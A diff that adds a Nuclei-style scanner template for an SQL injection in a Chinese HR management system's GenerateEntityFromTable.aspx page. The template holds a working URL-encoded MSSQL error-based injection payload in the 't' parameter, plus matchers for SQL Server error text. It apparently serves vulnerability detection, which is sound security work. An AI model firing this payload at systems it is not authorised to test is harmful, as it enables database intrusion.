@@ -1,0 +1,22 @@
+id: poc-yaml-zhi-yue-ren-li-xi-tong-generateentityfromtable-aspx-sqli
+info:
+  name: 智跃人力资源管理系统GenerateEntityFromTable.aspx SQL注入
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select+@@version))%2B%27"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "nvarchar"
+          - "System.Data.SqlClient"
+          - "Microsoft SQL Server"
